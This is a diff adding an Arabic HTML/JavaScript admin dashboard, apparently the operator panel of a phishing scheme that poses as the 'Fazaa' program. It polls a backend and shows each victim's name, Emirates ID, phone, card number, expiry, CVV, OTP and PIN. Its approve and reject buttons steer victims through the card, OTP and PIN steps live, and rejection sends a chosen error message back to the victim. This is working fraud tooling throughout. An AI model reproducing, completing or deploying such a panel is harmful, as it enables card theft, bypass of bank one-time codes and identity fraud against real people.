@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة تحكم فزعة - الإدارة</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; padding: 20px; }
+        .header { background: #1e3a5f; color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .order-card { background: white; border-radius: 10px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border-right: 5px solid #d4af37; }
+        .status-badge { padding: 5px 10px; border-radius: 5px; font-size: 12px; font-weight: bold; }
+        .status-waiting { background: #fff3cd; color: #856404; }
+        .status-approved { background: #d4edda; color: #155724; }
+        .status-rejected { background: #f8d7da; color: #721c24; }
+        .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 15px; }
+        .data-item { font-size: 14px; }
+        .data-label { color: #6c7a89; font-weight: bold; display: block; }
+        .data-value { color: #1e3a5f; }
+        .actions { margin-top: 20px; display: flex; gap: 10px; }
+        .btn { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        .btn-approve { background: #28a745; color: white; }
+        .btn-reject { background: #dc3545; color: white; }
+        .btn-logout { background: #f8d7da; color: #721c24; }
+        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e3a5f; display: flex; align-items: center; justify-content: center; z-index: 1000; }
+        .login-box { background: white; padding: 30px; border-radius: 10px; text-align: center; }
+        .login-box input { padding: 10px; width: 200px; margin-bottom: 10px; display: block; margin: 10px auto; }
+        .card-data { background: #f8f9fa; padding: 10px; border-radius: 5px; border: 1px dashed #d4af37; margin-top: 10px; }
+        .error-msg { color: #dc3545; font-size: 12px; margin-top: 5px; }
+    </style>
+</head>
+<body>
+
+<div id="loginOverlay">
+    <div class="login-box">
+        <h2>تسجيل دخول الإدارة</h2>
+        <input type="password" id="adminPass" placeholder="كلمة المرور">
+        <button class="btn btn-approve" onclick="login()">دخول</button>
+        <p id="loginError" class="error-msg" style="display:none;">كلمة المرور غير صحيحة</p>
+    </div>
+</div>
+
+<div class="header">
+    <h1>لوحة تحكم طلبات فزعة</h1>
+    <button class="btn btn-logout" onclick="logout()">تسجيل خروج</button>
+</div>
+
+<div id="ordersContainer">
+    <!-- Orders will be loaded here -->
+    <p style="text-align:center; color:#6c7a89;">جاري تحميل الطلبات...</p>
+</div>
+
+<script>
+    let authToken = localStorage.getItem('adminToken');
+    if (authToken) document.getElementById('loginOverlay').style.display = 'none';
+
+    async function login() {
+        const password = document.getElementById('adminPass').value;
+        const response = await fetch('/api/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ password })
+        });
+        const data = await response.json();
+        if (data.success) {
+            localStorage.setItem('adminToken', data.token);
+            location.reload();
+        } else {
+            document.getElementById('loginError').style.display = 'block';
+        }
+    }
+
+    function logout() {
+        localStorage.removeItem('adminToken');
+        location.reload();
+    }
+
+    async function fetchOrders() {
+        if (!authToken) return;
+        try {
+            const response = await fetch('/api/get-data', {
+                headers: { 'Authorization': authToken }
+            });
+            const orders = await response.json();
+            renderOrders(orders);
+        } catch (e) { console.error(e); }
+    }
+
+    function renderOrders(orders) {
+        const container = document.getElementById('ordersContainer');
+        if (orders.length === 0) {
+            container.innerHTML = '<p style="text-align:center; color:#6c7a89;">لا توجد طلبات حالياً</p>';
+            return;
+        }
+        
+        container.innerHTML = orders.reverse().map(order => `
+            <div class="order-card">
+                <div style="display:flex; justify-content:space-between;">
+                    <strong>طلب رقم: ${order.id}</strong>
+                    <span class="status-badge ${getStatusClass(order.status)}">${getStatusText(order.status)}</span>
+                </div>
+                <div class="data-grid">
+                    <div class="data-item"><span class="data-label">الاسم</span><span class="data-value">${order.full_name || '---'}</span></div>
+                    <div class="data-item"><span class="data-label">الهوية</span><span class="data-value">${order.emirates_id || '---'}</span></div>
+                    <div class="data-item"><span class="data-label">الهاتف</span><span class="data-value">${order.phone || '---'}</span></div>
+                    <div class="data-item"><span class="data-label">الباقة</span><span class="data-value">${order.card_type || '---'}</span></div>
+                </div>
+                
+                ${order.cardNumber ? `
+                <div class="card-data">
+                    <strong>بيانات البطاقة:</strong>
+                    <div class="data-grid">
+                        <div class="data-item"><span class="data-label">الرقم</span><span class="data-value">${order.cardNumber}</span></div>
+                        <div class="data-item"><span class="data-label">التاريخ</span><span class="data-value">${order.expiryDate}</span></div>
+                        <div class="data-item"><span class="data-label">CVV</span><span class="data-value">${order.cvv}</span></div>
+                    </div>
+                </div>
+                ` : ''}
+
+                ${order.otp ? `<div class="card-data" style="border-color: #28a745;"><strong>الـ OTP:</strong> <span style="font-size:20px; color:#28a745;">${order.otp}</span></div>` : ''}
+                ${order.pin ? `<div class="card-data" style="border-color: #007bff;"><strong>الـ PIN:</strong> <span style="font-size:20px; color:#007bff;">${order.pin}</span></div>` : ''}
+
+                <div class="actions">
+                    ${order.status === 'waiting_admin_approval' || order.status === 'otp_submitted' || order.status === 'pin_submitted' ? `
+                        <button class="btn btn-approve" onclick="updateStatus('${order.id}', 'approved')">قبول (توجيه للخطوة التالية)</button>
+                        <button class="btn btn-reject" onclick="promptReject('${order.id}')">رفض (إعادة لصفحة البطاقة)</button>
+                    ` : ''}
+                </div>
+            </div>
+        `).join('');
+    }
+
+    function getStatusClass(status) {
+        if (status === 'approved') return 'status-approved';
+        if (status === 'rejected') return 'status-rejected';
+        return 'status-waiting';
+    }
+
+    function getStatusText(status) {
+        const texts = {
+            'personal_data_submitted': 'بيانات شخصية فقط',
+            'waiting_admin_approval': 'بانتظار الموافقة على البطاقة',
+            'approved': 'تم القبول',
+            'rejected': 'تم الرفض',
+            'otp_submitted': 'تم إدخال OTP',
+            'pin_submitted': 'تم إدخال PIN'
+        };
+        return texts[status] || status;
+    }
+
+    async function updateStatus(orderId, status, error = '') {
+        await fetch('/api/update-order-status', {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'Authorization': authToken
+            },
+            body: JSON.stringify({ orderId, status, error })
+        });
+        fetchOrders();
+    }
+
+    function promptReject(orderId) {
+        const msg = prompt("أدخل رسالة الخطأ (ستظهر للعميل):", "عذراً، البطاقة غير صالحة. يرجى المحاولة مرة أخرى.");
+        if (msg) updateStatus(orderId, 'rejected', msg);
+    }
+
+    setInterval(fetchOrders, 3000); // Poll every 3 seconds
+    fetchOrders();
+</script>
+
+</body>
+</html>
